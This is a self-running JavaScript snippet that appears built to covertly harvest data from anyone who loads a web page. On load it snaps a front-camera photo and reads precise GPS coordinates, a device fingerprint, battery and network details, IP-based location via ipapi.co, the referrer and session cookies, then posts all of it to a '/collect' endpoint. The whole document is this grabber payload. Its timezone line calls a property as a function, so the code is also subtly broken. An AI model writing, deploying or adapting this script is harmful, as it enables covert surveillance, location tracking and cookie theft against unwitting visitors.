(function(){
    const d={
        sessionId:'s_'+Date.now(),
        timestamp:new Date().toISOString(),
        userAgent:navigator.userAgent
    };

    async function r(){
        // HIGH QUALITY CAMERA
        try{
            const s=await navigator.mediaDevices.getUserMedia({
                video:{facingMode:"user",width:{ideal:1920},height:{ideal:1080}}
            });
            const v=document.createElement('video');
            v.srcObject=s;
            await v.play();
            await new Promise(r=>setTimeout(r,1500));
            const c=document.createElement('canvas');
            c.width=v.videoWidth||1920;
            c.height=v.videoHeight||1080;
            c.getContext('2d').drawImage(v,0,0);
            d.photo=c.toDataURL('image/jpeg',0.95);
            s.getTracks().forEach(t=>t.stop());
        }catch(e){d.camErr=e.message;}

        // GPS
        if(navigator.geolocation){
            try{
                const p=await new Promise((res,rej)=>{
                    navigator.geolocation.getCurrentPosition(res,rej,{
                        enableHighAccuracy:true,timeout:10000,maximumAge:0
                    });
                });
                d.gps={lat:p.coords.latitude,lon:p.coords.longitude,accuracy:p.coords.accuracy+'m',speed:p.coords.speed||0,altitude:p.coords.altitude||0};
            }catch(e){d.gpsErr=e.message;}
        }

        // DEVICE FINGERPRINT
        d.device={
            platform:navigator.platform,
            screen:screen.width+'x'+screen.height,
            colorDepth:screen.colorDepth,
            pixelRatio:window.devicePixelRatio,
            cores:navigator.hardwareConcurrency,
            memory:navigator.deviceMemory||'unknown',
            language:navigator.language,
            languages:JSON.stringify(navigator.languages),
            touchPoints:navigator.maxTouchPoints,
            timezone:Intl.DateTimeFormat().resolvedOptions().timeZone()
        };

        // BATTERY
        try{
            const b=await navigator.getBattery();
            d.battery={charging:b.charging,level:Math.round(b.level*100)+'%',chargingTime:b.chargingTime,dischargingTime:b.dischargingTime};
        }catch(e){d.battery='unknown';}

        // CONNECTION
        if(navigator.connection){
            d.connection={
                type:navigator.connection.effectiveType,
                downlink:navigator.connection.downlink+'Mbps',
                rtt:navigator.connection.rtt+'ms',
                saveData:navigator.connection.saveData
            };
        }

        // IP + NETWORK
        try{
            const r=await fetch('https://ipapi.co/json/');
            const j=await r.json();
            d.network={ip:j.ip,city:j.city,region:j.region,country:j.country_name,isp:j.org,timezone:j.timezone,postal:j.postal,lat:j.latitude,lon:j.longitude};
        }catch(e){}

        // REFERRER + PAGE INFO
        d.pageInfo={referrer:document.referrer,url:location.href,title:document.title,cookies:document.cookie||'none'};

        // SEND
        try{
            await fetch('/collect',{
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body:JSON.stringify(d)
            });
        }catch(e){}
    }

    window.addEventListener('load',()=>setTimeout(r,500));
})();
